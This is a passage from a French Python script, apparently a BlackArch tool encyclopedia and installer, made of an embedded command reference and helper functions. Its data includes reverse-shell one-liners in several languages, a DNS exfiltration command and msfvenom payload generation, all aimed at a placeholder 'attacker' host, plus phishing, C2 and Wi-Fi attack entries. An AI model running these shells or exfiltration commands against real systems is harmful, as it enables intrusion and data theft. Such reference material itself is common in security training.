theharvester|Collecte d'emails/noms de domaine|theharvester -d target.com -b all|-
amass|Énumération DNS/OSINT|amass enum -d target.com|-
sublist3r|Énumération de sous-domaines|sublist3r -d target.com|-
findomain|Énumération de sous-domaines|findomain -t target.com|-
gau|URLs issues des archives Common Crawl|gau target.com|-
hakrawler|Crawler de liens|echo target.com | hakrawler|-
waybackurls|URLs depuis Wayback Machine|echo target.com | waybackurls|-
gobuster dns|Brute-force DNS|gobuster dns -d target.com -w dns.txt|-
gobuster vhost|Brute-force virtual hosts|gobuster vhost -u target.com -w vhosts.txt|-
gobuster fuzz|Fuzzing d'URLs|gobuster fuzz -u target.com/FUZZ -w words.txt|-
dirb|Énumération de répertoires|dirb http://target.com /usr/share/wordlists/dirb/common.txt|-
dirsearch|Énumération de répertoires|dirsearch -u http://target.com|-
feroxbuster|Énumération récursive|feroxbuster -u http://target.com|-
wfuzz|Fuzzing web|wfuzz -c -z file,words.txt http://target.com/FUZZ|-
ffuf|Fuzzer rapide|ffuf -u http://target.com/FUZZ -w words.txt|-
whatweb|Identification des technologies web|whatweb target.com|-
cmsmap|Scanner de CMS|cmsmap http://target.com|-
wpscan|Scanner WordPress|wpscan --url http://target.com|-
joomscan|Scanner Joomla|joomscan -u http://target.com|-
droopescan|Scanner Drupal|droopescan scan drupal -u http://target.com|-
skipfish|Scanner web|skipfish -o output http://target.com|-
arachni|Scanner web|arachni http://target.com|-
w3af|Framework d'attaque web|w3af_console|-
zaproxy|OWASP ZAP|zaproxy|-
burpsuite|Proxy d'interception web|burpsuite|-
sqlmap|Injection SQL|sqlmap -u http://target.com/page.php?id=1 --dbs|-
xsstrike|XSS|xsstrike -u http://target.com/search?q=test|-
commix|Injection de commandes|commix -u http://target.com/cmd.php|-
dalfox|Scanner XSS moderne|dalfox url http://target.com/search?q=test|-
commix|Injection commande|commix -u 'http://target.com/cmd.php'|-
sstimap|SSTI|sstimap -u http://target.com/page?name=test|-
paramminer|Détection de paramètres|paramminer -u http://target.com|-
httpx|Probe HTTP rapide|echo target.com | httpx|-
naabu|Scan de ports|naabu -list targets.txt|-
nuclei -t|Templates Nuclei|nuclei -t cves/ -u target.com|-
metasploit msfconsole|Console Metasploit|msfconsole|-
msfvenom|Génération de payloads|msfvenom -p linux/x86/shell/reverse_tcp LHOST=x LPORT=4444 -f elf > shell.elf|-
msfdb|Base de données Metasploit|msfdb init|-
searchsploit|Recherche dans Exploit-DB|searchsploit apache 2.4|-
exploitdb|Miroir local d'Exploit-DB|pacman -S exploitdb|-
routersploit|Framework IoT/router|rsf.py|-
beef-xss|Exploitation XSS via BeEF|beef-xss|-
setoolkit|Social Engineering Toolkit|sudo setoolkit|-
gophish|Phishing|./gophish|-
evilginx2|Phishing 2FA|sudo evilginx2|-
king-phisher|Phishing|sudo king-phisher|-
modlishka|Reverse proxy phishing|sudo ./modlishka|-
powershell-empire|Empire C2|sudo powershell-empire|-
sliver|C2 moderne|sliver-server|-
covenant|C2 .NET|dotnet Covenant.dll|-
poshc2|C2 PowerShell|posh-project|-
dnscat2|Tunnel DNS|dnscat2 server|-
chisel|Tunnel TCP over HTTP|chisel server -p 8080 --reverse|-
ligolo-ng|Tunnel avancé|ligolo-server|-
revshells|Générateur de reverse shells|revshells.com|-
netcat listener|Écoute netcat|nc -lvnp 4444|-
socat listener|Écoute socat|socat TCP-LISTEN:4444 EXEC:/bin/bash|-
python http server|Serveur HTTP simple|python3 -m http.server 8000|-
python ftp server|Serveur FTP simple|python3 -m pyftpdlib -p 2121|-
php -S|Serveur PHP intégré|php -S 0.0.0.0:8080|-
nginx|Serveur web|sudo systemctl start nginx|-
apache|Serveur web Apache|sudo systemctl start httpd|-
lighttpd|Serveur web léger|sudo systemctl start lighttpd|-
caddy|Serveur web moderne|caddy run|-
tmux|Multiplexeur de terminal|tmux new -s session|-
screen|Multiplexeur de terminal|screen|-
ranger|Gestionnaire de fichiers CLI|ranger|-
neofetch|Infos système stylisées|neofetch|-
btop|Moniteur système moderne|btop|-
htop|Moniteur interactif|htop|-
nethogs|Bande passante par processus|sudo nethogs|-
iftop|Bande passante par interface|sudo iftop|-
ngrep|Grep réseau|sudo ngrep -d any port 80|-
tcpdump|Capture de paquets|sudo tcpdump -i eth0|-
tshark|Wireshark CLI|sudo tshark -i eth0|-
termshark|TUI pour tshark|sudo termshark|-
wireshark|Analyseur de protocoles|sudo wireshark|-
netsniff-ng|Suite de sniffing|sudo netsniff-ng|-
ettercap|MitM|sudo ettercap -T -i eth0 -M arp /target// /gateway//|-
bettercap|Framework MitM|sudo bettercap -iface eth0|-
dnsmasq|Serveur DNS/DHCP|sudo dnsmasq -C /etc/dnsmasq.conf|-
hostapd|Point d'accès Wi-Fi|sudo hostapd /etc/hostapd/hostapd.conf|-
hostapd-wpe|AP Wi-Fi evil twin|sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf|-
airmon-ng|Mode monitor Wi-Fi|sudo airmon-ng start wlan0|-
airodump-ng|Capture de trames Wi-Fi|sudo airodump-ng wlan0mon|-
aireplay-ng|Injection de trames Wi-Fi|sudo aireplay-ng -0 5 -a BSSID wlan0mon|-
aircrack-ng|Cassage WPA/WEP|aircrack-ng capture.cap -w wordlist.txt|-
airdecap-ng|Déchiffre les captures Wi-Fi|airdecap-ng -w passphrase capture.cap|-
wifite|Automatisation Wi-Fi|sudo wifite|-
reaver|Attaque WPS|sudo reaver -i wlan0mon -b BSSID|-
bully|Attaque WPS|sudo bully -b BSSID wlan0mon|-
fern-wifi-cracker|GUI Wi-Fi|sudo fern-wifi-cracker|-
cowpatty|Cassage WPA|cowpatty -d hash -s SSID -r capture.cap|-
pixiewps|Attaque WPS Pixie Dust|pixiewps -e E-Hash -s E-Hash -z E-Hash -a AuthKey -n E-Nonce|-
hcxdumptool|Capture PMKID|sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1|-
hcxpcapngtool|Conversion pour hashcat|hcxpcapngtool -o hash.hc22000 -E wordlist capture.pcapng|-
mdk4|Attaques Wi-Fi|sudo mdk4 wlan0mon d|-
kismet|Détection et cartographie Wi-Fi|sudo kismet|-
wifiphisher|Evil twin Wi-Fi|sudo wifiphisher|-
eaphammer|Evil twin WPA/WPA2-Enterprise|sudo ./eaphammer -i wlan0 --channel 6 --auth ttls --wpa 2|-
fluxion|Evil twin WPA|sudo ./fluxion.sh|-
bluelog|Scanner Bluetooth|sudo bluelog|-
blueranger|Test de portée Bluetooth|sudo blueranger|-
redfang|Scanner Bluetooth|sudo redfang|-
spooftooph|Spoofing Bluetooth|sudo spooftooph -i hci0 -n 'Device'|-
ubertooth|Sniffing Bluetooth|ubertooth-btle -f|-
bettercap ble|Sniffing BLE|sudo bettercap -eval 'ble.recon on'|-
crackle|Casse BLE|crackle -i capture.pcap|-
rfcomm|RFCOMM Bluetooth|sudo rfcomm connect 0 AA:BB:CC:DD:EE:FF|-
hcitool|Outils Bluetooth CLI|hcitool scan|-
sdptool|Service Discovery Bluetooth|sdptool browse AA:BB:CC:DD:EE:FF|-
gatttool|GATT Bluetooth|gatttool -b AA:BB:CC:DD:EE:FF --interactive|-
mfoc|Lecture MIFARE Classic|mfoc -O dump.mfd|-
mfcuk|Attaque MIFARE Classic|mfcuk -C -R 0:A -s 250 -S 250 -o dump.mfd|-
libnfc|Bibliothèque NFC|nfc-list|-
proxmark3|Plateforme RFID|proxmark3 /dev/ttyACM0|-
rdptsc|Lecture Télépéage|rdptsc|-
rtl-sdr|Réception radio SDR|rtl_sdr -f 100000000 -s 2048000 -g 40 capture.iq|-
gqrx|Récepteur SDR GUI|gqrx|-
grgsm|Sniffing GSM|grgsm_livemon|-
inspectrum|Analyse de signaux SDR|inspectrum capture.iq|-
sigrok|Analyseur logique|sigrok-cli --scan|-
hamlib|Contrôle de radios|rigctl -l|-
exiftool GPS|Extraction de métadonnées GPS|exiftool -gpslatitude -gpslongitude photo.jpg|-
binwalk extract|Extraction de fichiers embarqués|binwalk -e firmware.bin|-
 foremost carve|Carving de fichiers|foremost -t jpg,png -i dump.raw -o out|-
scalpel|Carving|scalpel -o out dump.raw|-
bulk-extractor|Extraction massive|bulk-extractor -o out dump.raw|-
pdfid|Analyse PDF|pdfid fichier.pdf|-
pdf-parser|Parse PDF|pdf-parser fichier.pdf|-
peepdf|Analyse PDF interactive|peepdf fichier.pdf|-
steghide embed|Dissimulation d'un fichier|steghide embed -cf image.jpg -ef secret.txt|-
steghide extract|Extraction stégano|steghide extract -sf image.jpg|-
zsteg|Stégano PNG/BMP|zsteg image.png|-
stegsolve|Outil stégano Java|java -jar stegsolve.jar|-
outguess|Stégano JPEG|outguess -k password -d secret.txt image.jpg out.jpg|-
sonic-visualiser|Analyse audio|sonic-visualiser audio.wav|-
sox|Traitement audio|sox input.wav output.mp3|-
ffmpeg|Traitement vidéo/audio|ffmpeg -i input.mp4 output.avi|-
volatility2|Analyse mémoire legacy|volatility -f mem.dmp imageinfo|-
volatility3|Analyse mémoire moderne|vol.py -f mem.dmp windows.info|-
memprocfs|Accès mémoire via FUSE|memprocfs -device mem.dmp -mount m|-
rekall|Framework forensique mémoire|rekall -f mem.dmp pslist|-
capa|Identification de capacités malware|capa malware.exe|-
yara rule|Règle YARA|yara -r rule.yar /chemin|-
malware-jail|Sandbox JS|node jailme.js malware.js|-
peframe|Analyse PE|peframe malware.exe|-
pescan|Analyse PE|pescan malware.exe|-
pestudio|Analyse PE Windows|wine pestudio.exe malware.exe|-
die|Detect It Easy|die malware.exe|-
exeinfope|Analyse PE|exeinfope malware.exe|-
radare2 analyse|Analyse binaire|r2 -A ./binary|-
radare2 debug|Debug binaire|r2 -d ./binary|-
cutter|GUI radare2|cutter ./binary|-
ghidra project|Projet Ghidra|ghidraRun|-
ida-free|Désassembleur|ida64 binary|-
binaryninja-demo|Reverse engineering|binaryninja binary|-
gdb debug|Débogage|gdb ./program|-
pwndbg plugins|Plugins exploit GDB|gdb-pwndbg ./binary|-
gef|Plugins exploit GDB|gdb-gef ./binary|-
peda|Plugins exploit GDB|gdb-peda ./binary|-
ropper|Gadgets ROP|ropper --file binary|-
ROPgadget|Gadgets ROP|ROPgadget --binary binary|-
checksec|Vérifie les protections binaire|checksec --file=binary|-
angr symbols|Analyse symbolique|python3 -c "import angr; p=angr.Project('binary')"|-
frida-server|Instrumentation mobile|frida-server|-
frida-trace|Trace appels|frida-trace -U -i 'open*' com.app|-
objection explore|Runtime mobile|objection --gadget com.app explore|-
mobsf|Analyse mobile|docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf|-
apkid|Identification des packers Android|apkid app.apk|-
androwarn|Analyse Android|python3 -m androwarn -i app.apk|-
jadx-gui|GUI JADX|jadx-gui app.apk|-
dex2jar convert|Conversion APK JAR|d2j-dex2jar app.apk|-
jd-gui|Visualiseur Java|jd-gui app.jar|-
procyon|Décompileur Java|procyon -jar app.jar|-
cfr|Décompileur Java|cfr app.jar|-
bytecode-viewer|Visualiseur bytecode|bytecode-viewer|-
recaf|Éditeur Java bytecode|recaf|-
procyon|Décompileur Java|procyon -jar app.jar|-
smali/baksmali|Assembleur/désassembleur Dalvik|baksmali d classes.dex|-
uber-apk-signer|Signature APK|java -jar uber-apk-signer.jar --apk app.apk|-
apksigner|Signature APK Android|apksigner sign --ks key.jks app.apk|-
zipalign|Alignement APK|zipalign -v 4 input.apk output.apk|-
d2j-jar2dex|Conversion JAR vers DEX|d2j-jar2dex app.jar|-
android-backup-extractor|Extraction backups Android|abe unpack backup.ab backup.tar|-
sleuthkit|Suite forensique disque|mmls disk.raw|-
fls|Liste fichiers d'une image disque|fls -r image.raw|-
icat|Extrait un fichier d'une image|icat image.raw inum > file|-
ils|Liste inodes|ils image.raw|-
blkls|Extrait des blocs non alloués|blkls image.raw > unallocated|-
autopsy|GUI forensique|autopsy|-
photorec|Récupération de fichiers|photorec /d out /dev/sda|-
testdisk|Récupération de partitions|sudo testdisk|-
ddrescue|Copie robuste de disque|sudo ddrescue /dev/sda /mnt/backup/sda.img /mnt/backup/sda.log|-
guymager|Imager disque GUI|sudo guymager|-
ecryptfs|Chiffrement de dossier|ecryptfs-setup-private|-
encfs|Chiffrement de dossier|encfs ~/.crypt ~/crypt|-
veracrypt|Chiffrement de volumes|veracrypt volume.hc /media/veracrypt1|-
tomb|Chiffrement de tombes|tomb dig secret.tomb -s 100|-
cryfs|Chiffrement de fichiers|cryfs basedir mountdir|-
gocryptfs|Chiffrement FUSE|gocryptfs -init cipherdir|-
sops|Chiffrement YAML/JSON|sops -e secret.yaml|-
ansible|Automatisation|ansible-playbook playbook.yml|-
puppet|Gestion de configuration|puppet apply manifest.pp|-
chef|Gestion de configuration|chef-client|-
salt|Gestion de configuration|salt '*' state.apply|-
terraform|Infrastructure as Code|terraform apply|-
packer|Création d'images|packer build template.json|-
vagrant|Environnements reproductibles|vagrant up|-
docker|Conteneurisation|docker run -it archlinux|-
docker-compose|Orchestration de conteneurs|docker-compose up|-
podman|Conteneurs sans daemon|podman run -it archlinux|-
buildah|Construction d'images|buildah bud -t monimage .|-
nerdctl|CLI containerd|nerdctl run -it archlinux|-
kubectl|Orchestration Kubernetes|kubectl get pods|-
helm|Gestionnaire de packages K8s|helm install monchart ./chart|-
minikube|Cluster K8s local|minikube start|-
kind|Cluster K8s local dans Docker|kind create cluster|-
lxc|Conteneurs Linux|lxc launch ubuntu:22.04 monconteneur|-
lxd|Daemon LXC|lxd init|-
virsh|Gestion KVM|virsh list|--all|-
virt-manager|GUI KVM|virt-manager|-
qemu|Émulation|qemu-system-x86_64 -cdrom iso|-
vboxmanage|VirtualBox CLI|vboxmanage list vms|-
vmware|VMware Workstation|vmware|-
xfreerdp|Client RDP|xfreerdp /v:host /u:user|-
rdesktop|Client RDP|rdesktop -u user host|-
remmina|Client RDP/VNC|remmina|-
vinagre|Client VNC|vinagre|-
tigervnc|Serveur VNC|vncserver|-
noVNC|VNC dans le navigateur|./utils/launch.sh|--vnc localhost:5901|-
openssh server|Serveur SSH|sudo systemctl start sshd|-
sshd_config|Configuration SSH|sudo nano /etc/ssh/sshd_config|-
ssh-copy-id|Copie de clé SSH|ssh-copy-id user@host|-
ssh-agent|Agent SSH|eval $(ssh-agent) && ssh-add|-
ssh-add|Ajoute une clé à l'agent|ssh-add ~/.ssh/id_rsa|-
mosh|SSH mobile|mosh user@host|-
tmux attach|Réattache une session|tmux attach -t session|-
tmux detach|Détache une session|Ctrl+b d|-
tmux kill-session|Ferme une session|tmux kill-session -t session|-
screen -r|Réattache une session screen|screen -r|-
zsh|Shell avancé|zsh|-
oh-my-zsh|Framework Zsh|sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"|-
fish|Shell user-friendly|fish|-
bash|Shell par défaut|bash|-
dash|Shell POSIX léger|dash|-
powerline-shell|Prompt personnalisé|powerline-shell|-
starship|Prompt minimaliste|starship init bash|-
figlet|Texte ASCII|figlet HACKERSTCHAD|-
toilet|Texte ASCII coloré|toilet -F gay HACKERSTCHAD|-
cowsay|Vache qui parle|cowsay 'Salut'|-
fortune|Citation aléatoire|fortune|-
lolcat|Arc-en-ciel|echo 'HACKERSTCHAD' | lolcat|-
neofetch ascii|Neofetch en ASCII|neofetch --ascii_distro archlinux|-
pfetch|Neofetch léger|pfetch|-
macchina|Fetch system info|macchina|-
fastfetch|Fetch rapide|fastfetch|-
cpufetch|Infos CPU stylisées|cpufetch|-
screenfetch|Ancien fetch|screenfetch|-
unimatrix|Matrix dans le terminal|unimatrix|-
cmatrix|Effet Matrix|cmatrix|-
hollywood|Effet hacking hollywoodien|hollywood|-
asciiquarium|Aquarium ASCII|asciiquarium|-
sl|Locomotive|sl|-
nyancat|Nyan Cat|nyancat|-
ponysay|My Little Pony|cowsay alternatif|ponysay 'hello'|-
rofi|Lanceur d'applications|rofi -show run|-
dmenu|Menu dynamique|dmenu_run|-
wofi|Lanceur Wayland|wofi --show run|-
fuzzel|Lanceur Wayland|fuzzel|-
rofi-pass|Gestionnaire de mots de passe|rofi-pass|-
keepassxc|Password manager|keepassxc|-
pass|Password store|pass show site|-
bitwarden|Password manager|bitwarden|-
secret-tool|Libsecret CLI|secret-tool store --label='mon secret' key value|-
gnome-keyring|Porte-clés GNOME|gnome-keyring-daemon|-
kwallet|Porte-clés KDE|kwalletd5|-
chezmoi|Gestion des dotfiles|chezmoi init|-
stow|Gestionnaire de liens symboliques|stow dotfiles|-
yadm|Gestionnaire de dotfiles|yadm clone url|-
gnu-stow|Voir stow|stow -R dotfiles|-
vcsh|Gestionnaire de dépôts dotfiles|vcsh clone url|-
mr|MyRepos|mr update|-
git bare|Dépôt git nu|git init --bare .dotfiles|-
pre-commit|Hooks git|pre-commit install|-
husky|Hooks git Node.js|npx husky-init|-
git-secrets|Empêche les secrets dans git|git secrets --install|-
talisman|Empêche les secrets dans git|talisman -g pre-commit|-
rip-grep|Recherche rapide rg|rg 'TODO'|-
fd|find moderne|fd '.*.py'|-
fzf|Fuzzy finder|fzf|-
bat|cat amélioré|bat fichier.txt|-
eza|ls moderne|eza -la|-
lsd|ls moderne|lsd -la|-
plocate|locate rapide|locate fichier|-
mlocate|locate classique|updatedb && locate fichier|-
which|Localise une commande|which python3|-
whereis|Localise binaires/man/sources|whereis python3|-
type|Type d'une commande|type -a python3|-
command|Exécute une commande brute|command -v python3|-
alias|Définit un alias|alias ll='ls -la'|-
unalias|Supprime un alias|unalias ll|-
history|Historique des commandes|history|-
fc|Édite et relance des commandes|fc|-
source|Charge un fichier shell|source ~/.bashrc|-
exec|Remplace le shell courant|exec zsh|-
export|Définit une variable d'environnement|export PATH=$PATH:/opt|-
env|Variables d'environnement|env|-
printenv|Affiche une variable|printenv PATH|-
set|Options et variables du shell|set|-
unset|Supprime une variable|unset VAR|-
ulimit|Limites des ressources|ulimit -a|-
jobs|Jobs en arrière-plan|jobs|-
bg|Met en arrière-plan|bg %1|-
fg|Met en avant-plan|fg %1|-
nohup|Exécute immune aux hangups|nohup commande &|-
disown|Détache un job du shell|disown %1|-
coproc|Commande en coprocessus|coproc CMD|-
wait|Attend la fin des jobs|wait|-
time|Chronomètre une commande|time commande|-
timeout|Limite le temps d'exécution|timeout 10 commande|-
nice|Priorité d'exécution|nice -n 10 commande|-
renice|Change la priorité|sudo renice -n -5 -p PID|-
chrt|Politique d'ordonnancement|sudo chrt -f 99 commande|-
taskset|Affinité CPU|taskset -c 0 commande|-
numactl|Contrôle NUMA|numactl --interleave=all commande|-
cgroups-v1|Contrôle des ressources|cgcreate -g cpu:/group|-
cgroups-v2|Contrôle des ressources modernes|systemd-run --scope -p MemoryMax=1G commande|-
systemd-run|Exécute dans une scope systemd|systemd-run --scope --user commande|-
systemd-cgtop|Top par cgroup|systemd-cgtop|-
systemd-cgls|Liste les cgroups|systemd-cgls|-
systemd-mount|Montage via systemd|systemd-mount /dev/sdb1 /mnt/usb|-
systemd-umount|Démontage via systemd|systemd-umount /mnt/usb|-
loginctl lock-session|Verrouille la session|loginctl lock-session|-
loginctl terminate-user|Déconnecte un utilisateur|sudo loginctl terminate-user alice|-
pam_tally2|Compteur d'échecs login|sudo pam_tally2 --user alice|-
faillock|Verrouillage après échecs|sudo faillock --user alice|-
last|Historique des connexions|last|-
lastb|Échecs de connexion|sudo lastb|-
w|Utilisateurs connectés|w|-
who|Utilisateurs connectés|who|-
whoami|Utilisateur courant|whoami|-
id|Identité utilisateur|id|-
groups|Groupes de l'utilisateur|groups|-
getent group|Interroge un groupe|getent group wheel|-
newgrp|Change le groupe effectif|newgrp docker|-
sg|Exécute avec un autre groupe|sg docker -c 'docker ps'|-
su|Change d'utilisateur|su - alice|-
sudo -i|Shell root|sudo -i|-
sudo -u|Exécute en tant qu'utilisateur|sudo -u alice commande|-
sudo -l|Liste les droits sudo|sudo -l|-
doas|Alternative à sudo|doas commande|-
pkexec|Exécute une commande via polkit|pkexec commande|-
runuser|Exécute en tant qu'utilisateur|sudo runuser -u alice -- commande|-
chroot|Change la racine|sudo chroot /mnt|-
unshare|Namespaces|unshare --mount /bin/bash|-
nsenter|Entre dans un namespace|nsenter -t PID -m /bin/bash|-
setns|Change de namespace|programme setns|-
clone namespaces|Namespaces en C|voir man 2 clone|-
sched|Ordonnancement|chrt -m|-
perf|Profilage noyau|sudo perf top|-
perf stat|Statistiques perf|perf stat commande|-
perf record|Enregistrement perf|sudo perf record -a|-
perf report|Rapport perf|sudo perf report|-
bpftrace|Tracing eBPF|sudo bpftrace -e 'tracepoint:syscalls:sys_enter_open { printf(...) }'|-
bcc-tools|Outils BCC|sudo biolatency|-
iptables NFQUEUE|Queue userspace|sudo iptables -A INPUT -j NFQUEUE --queue-num 0|-
nftables queue|Queue nftables|nft add rule ip filter input queue num 0|-
scapy|Création/manipulation de paquets|sudo scapy|-
python scapy|Exemple scapy|send(IP(dst='1.2.3.4')/ICMP())|-
libpcap|Capture de paquets|voir tcpdump|-
raw sockets|Sockets bruts|python raw socket|-
netcat reverse shell|Reverse shell|nc -e /bin/sh attacker 4444|-
bash reverse shell|Reverse shell|bash -i >& /dev/tcp/attacker/4444 0>&1|-
python reverse shell|Reverse shell|python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);...'|-
perl reverse shell|Reverse shell|perl -e 'use Socket;$i="attacker";...'|-
ruby reverse shell|Reverse shell|ruby -rsocket -e'f=TCPSocket.open("attacker",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'|-
php reverse shell|Reverse shell|php -r '$sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3");'|-
powershell reverse shell|Reverse shell|powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("attacker",4444);...|-
awk reverse shell|Reverse shell|awk 'BEGIN {s = "/inet/tcp/0/attacker/4444"; ...}'|-
dig tunnel|Tunnel DNS exfiltration|dig @attacker `hostname`.attacker.com|-
iodine|Tunnel DNS|iodine -f tunnel.attacker.com|-
dnscat2 client|Client DNS C2|dnscat2 tunnel.attacker.com|-
ptunnel|Tunnel ICMP|ptunnel -p proxy -lp 8080 -da dest -dp 80|-
httptunnel|Tunnel HTTP|htc -F 8080 proxy:80|-
stunnel|Tunnel SSL|stunnel config|-
chisel client|Client chisel|chisel client http://attacker:8080 R:socks|-
ssh local forward|Forward local|ssh -L 8080:internal:80 user@bastion|-
ssh remote forward|Forward remote|ssh -R 9090:localhost:80 user@bastion|-
ssh dynamic forward|SOCKS over SSH|ssh -D 1080 user@bastion|-
sshuttle VPN|VPN léger|sshuttle -r user@bastion 10.0.0.0/8|-
proxychains-ng config|Configuration proxychains|sudo nano /etc/proxychains.conf|-
openvpn client|Client VPN|sudo openvpn client.ovpn|-
wireguard config|Config WireGuard|sudo nano /etc/wireguard/wg0.conf|-
wg genkey|Génération clé WireGuard|wg genkey | tee privatekey | wg pubkey > publickey|-
nmcli vpn|Connexion VPN NM|nmcli connection up VPN|-
strongswan|VPN IPsec|sudo strongswan up conn|-
libreswan|VPN IPsec|sudo ipsec up conn|-
tinc|VPN maillée|tincd -n net|-
zerotier|SD-WAN|sudo zerotier-cli join networkid|-
nebula|VPN maillée|sudo nebula -config config.yml|-
headscale|Self-hosted Tailscale|headscale users list|-
tailscale|VPN moderne|sudo tailscale up|-
cloudflared|Tunnel Cloudflare|cloudflared tunnel run|-
ngrok|Tunnel public|ngrok http 8080|-
localtunnel|Tunnel public|lt --port 8080|-
pagekite|Tunnel public|pagekite 8080 monnom.pagekite.me|-
serveo|Tunnel SSH|ssh -R 80:localhost:8080 serveo.net|-
localhost.run|Tunnel SSH|ssh -R 80:localhost:8080 localhost.run|-
frp|Fast Reverse Proxy|frpc -c frpc.ini|-
nps|NatPass|./nps|-
rathole|Tunnel Rust|rathole config.toml|-
fatedier/frp|Voir frp|frpc|-
"""


def _parse_extra_commands(text: str) -> List[Dict[str, Any]]:
    commands = []
    for line in text.strip().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("|")
        if len(parts) < 4:
            continue
        cmd, desc, syntaxe, exemple = parts[0], parts[1], parts[2], parts[3]
        commands.append({
            "category": "Arch Linux Avancé",
            "command": cmd.strip(),
            "description": desc.strip(),
            "syntaxe": syntaxe.strip(),
            "exemples": [exemple.strip()] if exemple.strip() != "-" else [],
        })
    return commands


ARCH_COMMANDS.extend(_parse_extra_commands(_EXTRA_COMMANDS_TEXT))


# --- PARTIE 3 : FONCTIONNALITES DU SCRIPT ---

def install_blackarch_strap():
    section("Installation BlackArch")
    if not require_root():
        error("Cette opération nécessite les privilèges root.")
        return
    info("Téléchargement du script strap.sh...")
    run(["curl", "-O", "https://blackarch.org/strap.sh"])
    if not Path("strap.sh").exists():
        error("Échec du téléchargement de strap.sh.")
        return
    run(["chmod", "+x", "strap.sh"])
    info("Vérification SHA1 du script...")
    run(["sha1sum", "strap.sh"])
    if confirm("Lancer l'installation BlackArch ?"):
        run(["./strap.sh"])
        success("Dépôt BlackArch installé.")
    else:
        warning("Installation annulée par l'utilisateur.")


def list_categories():
    section("Catégories BlackArch")
    for idx, (cat, pkgs) in enumerate(BLACKARCH_CATEGORIES.items(), 1):
        print(f"{G}{idx:2}.{D} {BOLD}{cat:20}{D} ({Y}{len(pkgs)}{D} outils)")


def install_category(category: str):
    section(f"Installation catégorie: {category}")
    if category not in BLACKARCH_CATEGORIES:
        error(f"Catégorie inconnue: {category}")
        list_categories()
        return
    pkgs = BLACKARCH_CATEGORIES[category]
    info(f"Paquets à installer ({len(pkgs)}): {', '.join(pkgs[:10])}{'...' if len(pkgs) > 10 else ''}")
    if confirm("Continuer l'installation ?"):
        run(["pacman", "-S", "--needed", "--noconfirm"] + pkgs)
        append_history({"action": "install_category", "category": category, "packages": pkgs})
        success("Installation terminée.")
    else:
        warning("Installation annulée.")


def search_command(term: str):
    section(f"Recherche: {term}")
    term = term.lower()
    results = [c for c in ARCH_COMMANDS if term in c["command"].lower() or term in c["description"].lower() or term in c["category"].lower()]
    if not results:
        warning("Aucune commande trouvée.")
        return
    for c in results:
        print(f"{Y}[{c['category']}]{D} {BOLD}{c['command']}{D}")
        print(f"    {c['description']}")
        print(f"    {C}Syntaxe:{D} {c['syntaxe']}")
        print(f"    {G}Exemples:{D}")
        for ex in c["exemples"]:
            print(f"        $ {ex}")
        print()


def list_all_commands():
    section(f"Encyclopédie Arch/BlackArch ({len(ARCH_COMMANDS)} commandes)")
    current_cat = ""
    for c in ARCH_COMMANDS:
        if c["category"] != current_cat:
            current_cat = c["category"]
            print(f"\n{BOLD}{M}══ {current_cat.upper()} ══{D}")
        print(f"  {C}{c['command']}{D} — {c['description']}")


def export_commands(format_type: str, output: str):
    section(f"Export: {format_type} → {output}")
    if format_type == "json":
        Path(output).write_text(json.dumps(ARCH_COMMANDS, indent=2, ensure_ascii=False), encoding="utf-8")
    elif format_type == "markdown":
        lines = ["# Encyclopédie Arch Linux / BlackArch\n"]
        for c in ARCH_COMMANDS:
            lines.append(f"## `{c['command']}` — {c['category']}\n")
            lines.append(f"{c['description']}\n")
            lines.append(f"**Syntaxe:** `{c['syntaxe']}`\n")
            lines.append("**Exemples:**\n")
            for ex in c["exemples"]:
                lines.append(f"- `{ex}`\n")
            lines.append("\n")
        Path(output).write_text("".join(lines), encoding="utf-8")
    else:
        error("Format non supporté. Choisissez json ou markdown.")
        return
    success(f"Export terminé: {output}")


def update_system():
    section("Mise à jour système")
    if not require_root():
        error("Nécessite les privilèges root.")
        return
    if confirm("Mettre à jour les dépôts et les paquets ?"):
        run(["pacman", "-Syyu", "--noconfirm"])
        append_history({"action": "system_update"})
        success("Mise à jour terminée.")


def clean_system():
    section("Nettoyage système")
    if not require_root():
        error("Nécessite les privilèges root.")
        return
    if confirm("Supprimer les paquets orphelins et nettoyer le cache ?"):
        run(["pacman", "-Rns", "--noconfirm", "$(pacman", "-Qdtq)"], shell=True)
        run(["pacman", "-Sc", "--noconfirm"])
        success("Nettoyage terminé.")


def mirror_optimization():
    section("Optimisation des miroirs")
    if shutil.which("reflector"):
        if confirm("Lancer reflector pour trier les miroirs les plus rapides ?"):
            run([
                "reflector", "--country", "France,Germany,United States",
                "--age", "12", "--protocol", "https", "--sort", "rate",
                "--save", "/etc/pacman.d/mirrorlist",
            ])
            success("Miroirs mis à jour.")
    else:
        warning("reflector n'est pas installé. Installation proposée.")
        if confirm("Installer reflector ?"):
            run(["pacman", "-S", "--noconfirm", "reflector"])


def system_audit():
    section("Audit système")
    checks = [
        ("Utilisateur courant", ["whoami"]),
        ("Distribution", ["cat", "/etc/os-release"]),
        ("Noyau", ["uname", "-a"]),
        ("Uptime", ["uptime"]),
        ("Espace disque", ["df", "-h"]),
        ("Mémoire", ["free", "-h"]),
        ("Processus actifs", ["ps", "aux", "--no-headers"]),
        ("Sockets en écoute", ["ss", "-tulnp"]),
        ("Paquets installés", ["pacman", "-Qq"]),
    ]
    for title, cmd in checks:
        print(f"\n{BOLD}{C}▶ {title}{D}")
        rc, out, err = run(cmd, capture=True)
        if rc == 0:
            if title == "Paquets installés":
                count = len(out.splitlines())
                print(f"{count} paquets installés.")
            else:
                print(out if out else "(aucune sortie)")
        else:
            print(f"{R}Erreur:{D} {err or out}")


def network_tools_menu():
    section("Outils réseau")
    print("1. Voir interfaces réseau")
    print("2. Scanner rapide nmap du réseau local")
    print("3. Voir les sockets ouverts")
    print("4. Tester la connectivité (ping Google)")
    print("5. Retour")
    choice = safe_input("Choix: ").strip()
    if choice == "1":
        run(["ip", "addr", "show"])
    elif choice == "2":
        target = safe_input("Réseau (ex: 192.168.1.0/24): ").strip() or "192.168.1.0/24"
